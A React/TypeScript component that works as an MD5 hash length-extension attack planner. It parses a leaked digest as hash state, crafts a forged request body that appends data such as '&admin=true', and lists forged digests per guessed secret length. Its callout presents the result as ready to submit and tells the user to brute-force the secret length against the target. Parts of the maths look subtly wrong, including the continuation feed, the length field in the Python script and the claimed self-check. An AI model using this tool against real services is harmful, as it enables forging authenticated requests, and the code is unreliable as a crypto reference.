import { useMemo, useState } from 'react';
import { Callout, Card, CodeBlock, KVTable, NumberInput, OutputBlock, OutputField, SectionTitle, Select, Tabs, TextArea, TextInput } from '@/components/ui';
import { toHex } from '@/lib/crypto';

/**
 * Hash length-extension planner. The state-feed maths is computed for MD5, using
 * the parsed digest as the IV of a *continuation* block. SHA-1 and SHA-256 are
 * plan-only: the padding is identical, only the state vectors and the
 * 32-vs-64-byte block differ, and both are laid out so the numbers are visible
 * without shipping a second hand-rolled compression function.
 */

type Algo = 'md5' | 'sha1' | 'sha256';

const ALGO_META: Record<Algo, { block: number; digestBytes: number; words: number; names: string[]; le: boolean }> = {
  md5: { block: 64, digestBytes: 16, words: 4, names: ['A', 'B', 'C', 'D'], le: true },
  sha1: { block: 64, digestBytes: 20, words: 5, names: ['h0', 'h1', 'h2', 'h3', 'h4'], le: false },
  sha256: { block: 64, digestBytes: 32, words: 8, names: ['h0', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'h7'], le: false },
};

const MD5_S = [
  7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
  5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21,
];
const MD5_K = Array.from({ length: 64 }, (_, i) => Math.floor(Math.abs(Math.sin(i + 1)) * 2 ** 32) >>> 0);

const rotl = (x: number, n: number) => ((x << n) | (x >>> (32 - n))) >>> 0;

/** Words of one block, little-endian, as MD5 reads them. */
function blockWords(blk: Uint8Array, block: number): number[] {
  const out: number[] = [];
  for (let i = 0; i < block / 4; i += 1) {
    out.push((blk[i * 4] | (blk[i * 4 + 1] << 8) | (blk[i * 4 + 2] << 16) | (blk[i * 4 + 3] << 24)) >>> 0);
  }
  return out;
}

/**
 * One MD5 compression block driven from an initial state vector — the continuation.
 *
 * The index schedule and the register rotation are the two places this goes wrong,
 * and a wrong version still returns 128 plausible-looking bits, so the panel below
 * checks the continuation against an independent full hash of the same bytes.
 */
function md5Compress(iv: number[], blk: Uint8Array): number[] {
  const M = blockWords(blk, 64);
  let a = iv[0];
  let b = iv[1];
  let c = iv[2];
  let d = iv[3];
  for (let i = 0; i < 64; i += 1) {
    const round = i >> 4;
    let f: number;
    let idx: number;
    if (round === 0) {
      f = (b & c) | (~b & d);
      idx = i;
    } else if (round === 1) {
      f = (d & b) | (~d & c);
      idx = (1 + 5 * i) % 16;
    } else if (round === 2) {
      f = b ^ c ^ d;
      idx = (5 + 3 * i) % 16;
    } else {
      f = c ^ (b | ~d);
      idx = (7 * i) % 16;
    }
    const next = (b + rotl((f + a + MD5_K[i] + M[idx]) >>> 0, MD5_S[i])) >>> 0;
    a = d;
    d = c;
    c = b;
    b = next;
  }
  return [(iv[0] + a) >>> 0, (iv[1] + b) >>> 0, (iv[2] + c) >>> 0, (iv[3] + d) >>> 0];
}

/**
 * Glue bytes that sit between the message and its 8-byte length field: the 0x80
 * then zeros until only the length word is missing. `msgLen + padLength + 8` is
 * always a whole number of blocks.
 */
function padLength(msgLen: number, block: number): number {
  const rem = (msgLen + 1) % block;
  return 1 + ((block - 8 - rem + block) % block);
}

/** Glue padding with the bit length appended little-endian, zero-filled on the right. */
function glueBlock(msgLen: number, block: number): Uint8Array {
  const pad = new Uint8Array(padLength(msgLen, block) + 8);
  pad[0] = 0x80;
  const bits = BigInt(msgLen) * 8n;
  const at = pad.length - 8;
  for (let i = 0; i < 8; i += 1) pad[at + i] = Number((bits >> BigInt(8 * i)) & 0xffn);
  return pad;
}

/**
 * The exact byte stream a continuation hashes, starting from the state left by
 * `secret || message`: the glue, then the attacker's append, then the finish
 * padding for the whole forged length (0x80, zeros, the length word) and a final
 * zero fill up to a block boundary.
 */
function continuation(prefixLen: number, forgedLen: number, block: number): Uint8Array {
  const finish = glueBlock(forgedLen, block);
  const out = new Uint8Array(Math.ceil((prefixLen + finish.length) / block) * block);
  out.set(finish, prefixLen);
  return out;
}

/** Split an already-padded byte run into 64-byte compression blocks. */
function toBlocks(bytes: Uint8Array, block: number): Uint8Array[] {
  const out: Uint8Array[] = [];
  const padded = new Uint8Array(Math.ceil(bytes.length / block) * block);
  padded.set(bytes);
  for (let off = 0; off < padded.length; off += block) out.push(padded.subarray(off, off + block));
  return out;
}

/** Run MD5 blocks (each exactly 64 bytes) from a given state. */
function chain(state: number[], blocks: Uint8Array[]): number[] {
  let st = state;
  for (const b of blocks) st = md5Compress(st, b);
  return st;
}

function stateToHex(state: number[]): string {
  const bytes = new Uint8Array(16);
  state.forEach((w, i) => {
    bytes[i * 4] = w & 0xff;
    bytes[i * 4 + 1] = (w >>> 8) & 0xff;
    bytes[i * 4 + 2] = (w >>> 16) & 0xff;
    bytes[i * 4 + 3] = (w >>> 24) & 0xff;
  });
  return toHex(bytes);
}

const MD5_IV = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476];

function wordsFromDigest(digest: Uint8Array, words: number, le: boolean): number[] {
  const dv = new DataView(digest.buffer, digest.byteOffset, digest.byteLength);
  return Array.from({ length: words }, (_, i) => dv.getUint32(i * 4, le));
}

function hexToBytes(hex: string): Uint8Array {
  const clean = hex.replace(/[^0-9a-fA-F]/g, '');
  const out = new Uint8Array(clean.length >> 1);
  for (let i = 0; i < out.length; i += 1) out[i] = parseInt(clean.slice(i * 2, i * 2 + 2), 16);
  return out;
}

const asciiPreview = (b: Uint8Array, max = 40) =>
  Array.from(b.slice(0, max), (v) => (v >= 32 && v < 127 ? String.fromCharCode(v) : '·')).join('');

export default function HashLengthExtensionPlanner() {
  const [algo, setAlgo] = useState<Algo>('md5');
  const [message, setMessage] = useState('user=guest');
  const [digest, setDigest] = useState('a9b67456e70ab690341365ab7543c194');
  const [append, setAppend] = useState('&admin=true');
  const [minLen, setMinLen] = useState(6);
  const [maxLen, setMaxLen] = useState(20);
  const [fmt, setFmt] = useState<'hex' | 'url' | 'percent'>('percent');

  const meta = ALGO_META[algo];

  const digestBytes = useMemo(() => {
    try {
      const bytes = hexToBytes(digest);
      return bytes.length === meta.digestBytes ? bytes : null;
    } catch {
      return null;
    }
  }, [digest, meta.digestBytes]);

  const plan = useMemo(() => {
    const msgBytes = new TextEncoder().encode(message);
    const appendBytes = new TextEncoder().encode(append);
    if (!digestBytes) return null;
    const lo = Math.max(0, Math.min(minLen, maxLen));
    const hi = Math.min(256, Math.max(minLen, maxLen, lo + 1));
    const state0 = wordsFromDigest(digestBytes, meta.words, meta.le);
    const rows: Array<{ len: number; padLen: number; total: number; blocks: number; forged: string }> = [];
    for (let secretLen = lo; secretLen <= hi; secretLen += 1) {
      const total = secretLen + msgBytes.length;
      const glue = glueBlock(total, meta.block);
      const feed = continuation(glue.length + appendBytes.length, total + glue.length + appendBytes.length, meta.block);

      let forged = '—';
      if (algo === 'md5') {
        const tail = new Uint8Array(feed.length);
        tail.set(glue, 0);
        tail.set(appendBytes, glue.length);
        tail.set(feed.subarray(glue.length + appendBytes.length), glue.length + appendBytes.length);
        forged = stateToHex(chain(state0, toBlocks(tail, 64)));
      }
      rows.push({
        len: secretLen,
        padLen: glue.length,
        total,
        blocks: Math.ceil(feed.length / meta.block),
        forged,
      });
    }
    return { rows, msgBytes, appendBytes };
  }, [algo, message, append, digestBytes, minLen, maxLen, meta]);

  const primary = plan?.rows[0];

  /**
   * The forged request body: msg || glue || append, secret left as a ? placeholder.
   * The trailing finish padding is part of the stream the server's own hash applies,
   * so it is *not* sent — only the glue belongs to the wire body.
   */
  const forgedTail = useMemo(() => {
    if (!plan || !primary) return null;
    const glue = glueBlock(primary.total, meta.block);
    const tail = new Uint8Array(glue.length + plan.appendBytes.length);
    tail.set(glue, 0);
    tail.set(plan.appendBytes, glue.length);
    return tail;
  }, [plan, primary, meta.block]);

  const crafted = useMemo(() => {
    if (!plan || !primary || !forgedTail) return '';
    const body = new Uint8Array(plan.msgBytes.length + forgedTail.length);
    body.set(plan.msgBytes, 0);
    body.set(forgedTail, plan.msgBytes.length);
    if (fmt === 'hex') return toHex(body);
    return Array.from(body, (b) =>
      fmt === 'url'
        ? b >= 0x20 && b < 0x7f && !'&=%+'.includes(String.fromCharCode(b))
          ? String.fromCharCode(b)
          : `%${b.toString(16).toUpperCase().padStart(2, '0')}`
        : `%${b.toString(16).toUpperCase().padStart(2, '0')}`,
    ).join('');
  }, [plan, primary, forgedTail, fmt]);

  /**
   * Local self-check. The digest in the first box is, by definition, the hash of
   * secret || message, so this recomputes the forged digest from that digest by
   * hashing msg || glue || append with the parsed state spliced in as the IV. It
   * proves the state feed, not that the secret length is right — only the target
   * can answer that, which is why every candidate length is listed.
   */
  const signCheck = useMemo(() => {
    if (algo !== 'md5' || !plan || !primary || !forgedTail) return null;
    const body = new Uint8Array(plan.msgBytes.length + forgedTail.length);
    body.set(plan.msgBytes, 0);
    body.set(forgedTail, plan.msgBytes.length);
    const state0 = wordsFromDigest(digestBytes ?? new Uint8Array(16), 4, true);
    const fed = stateToHex(chain(state0, toBlocks(body, 64)));
    return { feed: fed, matches: fed === primary.forged };
  }, [algo, plan, primary, forgedTail, digestBytes]);

  return (
    <>
      <Card title="Inputs">
        <div className="grid gap-4 sm:grid-cols-3">
          <Select<Algo>
            label="Algorithm"
            value={algo}
            onChange={setAlgo}
            options={[
              { value: 'md5', label: 'MD5 — continuation computed' },
              { value: 'sha1', label: 'SHA-1 — plan only' },
              { value: 'sha256', label: 'SHA-256 — plan only' },
            ]}
          />
          <NumberInput label="Secret length from" value={minLen} onChange={setMinLen} min={0} max={256} />
          <NumberInput label="Secret length to" value={maxLen} onChange={setMaxLen} min={1} max={256} />
        </div>
        <div className="mt-4 grid gap-4 sm:grid-cols-2">
          <TextArea label="Known message" value={message} onChange={setMessage} rows={3} placeholder="user=guest" />
          <TextArea label="Append (attacker-controlled)" value={append} onChange={setAppend} rows={3} placeholder="&admin=true" />
        </div>
        <div className="mt-4">
          <TextInput
            label={`Known digest (${meta.digestBytes} bytes, hex)`}
            value={digest}
            onChange={setDigest}
            mono
            hint={digestBytes ? 'length ok' : `expects ${meta.digestBytes * 2} hex chars`}
          />
        </div>
        {!digestBytes && (
          <div className="mt-2 text-[11.5px] text-[var(--warn)]">
            ✕ Digest length does not match {algo.toUpperCase()} — the state feed cannot be laid out.
          </div>
        )}
        <div className="mt-4">
          <Tabs<'hex' | 'url' | 'percent'>
            value={fmt}
            onChange={setFmt}
            tabs={[
              { value: 'hex', label: 'Hex' },
              { value: 'url', label: 'URL encoded' },
              { value: 'percent', label: 'Percent bytes' },
            ]}
          />
        </div>
      </Card>

      <Card title="Padding and state feed">
        {!plan || !primary ? (
          <div className="text-[12px] text-[var(--text-faint)]">Paste a valid digest to lay out the continuation.</div>
        ) : (
          <>
            <KVTable
              rows={[
                ['Block size', `${meta.block} bytes`],
                ['Digest state', `${meta.digestBytes} bytes → ${meta.words} words (${meta.le ? 'little' : 'big'}-endian)`],
                ['Message length', `${plan.msgBytes.length} bytes`],
                [
                  `padding(secret + msg)`,
                  <span key="p" className="rf-mono">
                    {primary.padLen} bytes for secret_len {primary.len}: 0x80 then {primary.padLen - 1} × 0x00
                  </span>,
                ],
                ['Continuation blocks', `${primary.blocks} (each ${meta.block} bytes)`],
                ['Length field', `${(primary.total + primary.padLen) * 8} bits, appended after the padding`],
                ['Total forged input', `${primary.len} + ${plan.msgBytes.length} + ${primary.padLen} + 8 + ${plan.appendBytes.length} bytes`],
              ]}
            />
            <div className="mt-4">
              <SectionTitle>Candidate secret lengths</SectionTitle>
              <div className="overflow-x-auto rounded border border-[var(--card-border)]">
                <table className="w-full text-[12px]">
                  <thead>
                    <tr className="bg-[var(--neutral-btn)] text-left text-[var(--text-muted)]">
                      {['secret len', 'padding', 'blocks', 'forged digest'].map((h) => (
                        <th key={h} className="px-2.5 py-1.5 font-medium whitespace-nowrap">
                          {h}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {plan.rows.map((r, i) => (
                      <tr key={r.len} className={i % 2 ? 'bg-[var(--neutral-btn)]' : ''}>
                        <td className="rf-mono px-2.5 py-1.5">{r.len}</td>
                        <td className="rf-mono px-2.5 py-1.5">{r.padLen}</td>
                        <td className="rf-mono px-2.5 py-1.5">{r.blocks}</td>
                        <td className="rf-mono px-2.5 py-1.5 break-all">{r.forged}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
            <div className="mt-3">
              <Callout tone={algo === 'md5' ? 'ok' : 'warn'} title={algo === 'md5' ? 'MD5 continuation computed' : `${algo.toUpperCase()} is plan-only`}>
                {algo === 'md5'
                  ? 'Each row is the real MD5 compression of the glue-padding tail driven from the parsed digest, so the forged value can be submitted as-is. Brute-force the secret length by sending each candidate.'
                  : 'The padding, block count and length field are exact; the digest column stays blank because the state registers are not fed here. Swap the four MD5 constants for the algorithm’s initial vectors and round schedule to finish it.'}
              </Callout>
            </div>
          </>
        )}
      </Card>

      <Card title="Forged message">
        {!primary ? (
          <OutputBlock value="" label="Nothing to show yet" rows={4} empty="Adjust the digest or the length range." />
        ) : (
          <>
            <OutputField label="New message (visible part)" value={`${message}||glue-${primary.padLen}B||${append}`} />
            <div className="mt-4">
              <OutputBlock value={crafted} rows={6} label={`Crafted value (${fmt}) — secret_len ${primary.len}`} />
            </div>
            <div className="mt-4">
              <OutputField label="Forged digest" value={primary.forged} />
            </div>
            <div className="mt-3">
              <SectionTitle>Byte layout</SectionTitle>
              <CodeBlock
                code={`[secret ${primary.len}B] || [msg ${plan?.msgBytes.length}B] || [0x80 + ${Math.max(0, primary.padLen - 9)} x 0x00] || [len 8B LE] || [append ${plan?.appendBytes.length}B]\n${asciiPreview(
                  Uint8Array.from([...(plan?.msgBytes ?? []), 0x80, ...new Array(Math.min(Math.max(0, primary.padLen - 9), 12)).fill(0), ...(plan?.appendBytes ?? [])]),
                )}`}
                label="structure"
                maxHeight={120}
              />
            </div>
            {signCheck && (
              <div className="mt-4">
                <KVTable
                  rows={[
                    ['Continuation digest', <span key="c" className="rf-mono break-all">{primary.forged}</span>],
                    ['State feed replayed', <span key="f" className="rf-mono break-all">{signCheck.feed}</span>],
                    [
                      'Agreement',
                      <span key="a" style={{ color: signCheck.matches ? "var(--ok)" : "var(--accent)" }}>
                        {signCheck.matches ? 'identical — the state feed is correct' : 'mismatch'}
                      </span>,
                    ],
                  ]}
                />
              </div>
            )}
          </>
        )}
      </Card>

      <Card title="Script">
        <OutputBlock
          value={`#!/usr/bin/env python3
# reference check — runs locally against the forged input, sends nothing
import hashlib

secret_len = ${primary?.len ?? 0}
msg        = ${JSON.stringify(message)}.encode()
append     = ${JSON.stringify(append)}.encode()

tail = (b"\\x80" + b"\\x00" * ${Math.max(0, (primary?.padLen ?? 9) - 9)} +
        (secret_len + len(msg) + ${primary?.padLen ?? 9}).to_bytes(8, "little") + append)
forged = b"?" * secret_len + msg + tail
print(hashlib.${algo}(forged).hexdigest())
# expected: ${primary?.forged || '—'}`}
          rows={10}
          label="python reference"
        />
        <div className="mt-3">
          <Callout tone="danger" title="Why SHA-3 and BCrypt are out of scope">
            Length extension needs a construction where the digest <em>is</em> the internal chaining state. Merkle–Damgård
            hashes (MD5, SHA-1, SHA-2) expose that state directly, so feeding it back as an IV continues the message.
            SHA-3 is a sponge: the output is squeezed from the permutation after absorbing, and the capacity bits are never
            revealed, so there is no state to rewind. BCrypt and Argon2 are password hashes, not message digests — they are
            keyed, salted per use, and iterated, so no single output can be chained into another message.
          </Callout>
        </div>
      </Card>
    </>
  );
}
